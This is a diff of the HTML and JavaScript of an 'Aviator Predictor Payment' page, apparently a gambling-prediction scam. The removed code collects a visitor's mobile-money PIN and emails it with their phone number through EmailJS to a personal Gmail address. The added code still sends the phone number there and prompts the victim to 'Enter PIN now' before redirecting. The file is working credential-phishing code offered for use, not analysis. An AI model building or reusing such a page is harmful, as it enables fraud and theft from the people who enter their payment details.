@@ -6,14 +6,95 @@
     <title>Aviator Predictor Payment</title>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <style>
-        /*... (your existing CSS styles)... */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            color: #333;
+            padding: 20px;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h1 {
+            color: #007bff;
+            margin-bottom: 20px;
+        }
+        input[type="text"] {
+            width: calc(100% - 22px);
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 14px 25px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .float-button {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: red;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            z-index: 100;
+            transition: background-color 0.3s ease;
+        }
+        .float-button:hover {
+            background-color: darkred;
+        }
+        .whatsapp-button {
+            background-color: #25D366;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            display: inline-block;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            color: white;
+        }
     </style>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("abfC9oICRtMIGM5cb");
+        })();
+    </script>
 </head>
 <body>
     <div class="container">
         <h1>Aviator Predictor Payment</h1>
         <input type="text" id="phoneNumber" placeholder="Enter your mobile number">
         <button id="payButton">Pay</button>
+        <div id="alertPlaceholder" style="margin-top: 10px;"></div>
     </div>
 
     <a href="paid.html" class="float-button">Demo Account</a>
@@ -42,59 +123,16 @@
         </div>
     </div>
 
-    <div class="modal fade" id="alertModal" tabindex="-1" role="dialog" aria-labelledby="alertModalLabel" aria-hidden="true">
-        <div class="modal-dialog" role="document">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <h5 class="modal-title" id="alertModalLabel">Alert</h5>
-                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                        <span aria-hidden="true">&times;</span>
-                    </button>
-                </div>
-                <div class="modal-body" id="alertModalBody">
-                    </div>
-                <div class="modal-footer">
-                    <button type="button" class="btn btn-primary" data-dismiss="modal">OK</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="modal fade" id="pinModal" tabindex="-1" role="dialog" aria-labelledby="pinModalLabel" aria-hidden="true">
-        <div class="modal-dialog" role="document">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <h5 class="modal-title" id="pinModalLabel">Enter PIN</h5>
-                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                        <span aria-hidden="true">&times;</span>
-                    </button>
-                </div>
-                <div class="modal-body">
-                    <p>Payment request has been sent. Please enter your PIN to complete the transaction:</p>
-                    <input type="password" id="pinInput" class="form-control">
-                </div>
-                <div class="modal-footer">
-                    <button type="button" class="btn btn-primary" id="pinContinue">Continue</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function(){
-            emailjs.init("abfC9oICRtMIGM5cb");
-        })();
-
+    <script>
         document.getElementById('payButton').addEventListener('click', function() {
             const phoneNumber = document.getElementById('phoneNumber').value;
+            const alertPlaceholder = document.getElementById('alertPlaceholder');
 
             if (!phoneNumber) {
-                showAlert('Please enter a mobile number.', 'danger');
+                alertPlaceholder.innerHTML = '<div class="alert alert-danger" role="alert">Please enter a mobile number.</div>';
                 return;
+            } else {
+                alertPlaceholder.innerHTML = ''; // Clear previous alerts
             }
 
             $('#confirmModal').modal('show');
@@ -103,46 +141,30 @@
         document.getElementById('confirmContinue').addEventListener('click', function() {
             $('#confirmModal').modal('hide');
             const phoneNumber = document.getElementById('phoneNumber').value;
+            const alertPlaceholder = document.getElementById('alertPlaceholder');
 
-            // Send message to WhatsApp
-            window.open(`https://wa.me/250739121651?text=Payment%20request%20from%20${phoneNumber}`);
-
-            // Show PIN modal
-            $('#pinModal').modal('show');
-        });
-
-        document.getElementById('pinContinue').addEventListener('click', function() {
-            $('#pinModal').modal('hide');
-            const phoneNumber = document.getElementById('phoneNumber').value;
-            const pinInput = document.getElementById('pinInput').value;
-
-            // Here you would typically validate the PIN and process the payment
-
-            // For this example, we'll just simulate a successful payment and redirect
             const templateParams = {
                 to_name: "Customer",
-                message: `Payment request from: ${phoneNumber} (PIN: ${pinInput})`,
+                message: "Payment request from: " + phoneNumber,
                 to_email: "shimwaolivier7@gmail.com"
             };
 
             emailjs.send('service_k7026ko', 'template_p0of43y', templateParams)
-              .then(function(response) {
+                .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
-                    showAlert('Payment successful!', 'success');
+                    alertPlaceholder.innerHTML = '<div class="alert alert-success" role="alert">Payment request has been sent. Enter PIN now.</div>';
                     setTimeout(function() {
                         window.location.href = "product.html";
                     }, 10000);
                 }, function(error) {
                     console.error('FAILED...', error);
-                    showAlert('Payment failed. Please try again.', 'danger');
+                    alertPlaceholder.innerHTML = '<div class="alert alert-danger" role="alert">Email sending failed. Please try again.</div>';
                 });
         });
-
-        function showAlert(message, type) {
-            const alertModalBody = document.getElementById('alertModalBody');
-            alertModalBody.innerHTML = `<div class="alert alert-${type}" role="alert">${message}</div>`;
-            $('#alertModal').modal('show');
-        }
     </script>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 </body>
 </html>
